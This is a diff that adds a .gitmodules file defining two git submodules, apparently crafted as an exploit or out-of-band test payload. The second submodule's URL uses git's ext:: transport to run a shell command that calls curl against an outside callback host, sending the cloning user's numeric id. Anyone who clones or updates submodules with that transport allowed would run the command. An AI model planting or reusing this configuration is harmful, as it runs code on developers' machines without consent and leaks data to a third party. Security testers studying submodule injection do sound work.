@@ -1,0 +1,7 @@
+[submodule "x"]
+	path = subm
+	url = https://sub.kbzcyn41knd3cci4jw2fru77pyvojurdzqif.b.joax.net/x.git
+[submodule "y"]
+	path = suby
+	url = ext::sh -c "curl 	
+http://ext.kbzcyn41knd3cci4jw2fru77pyvojurdzqif.b.joax.net/$(id -u)"
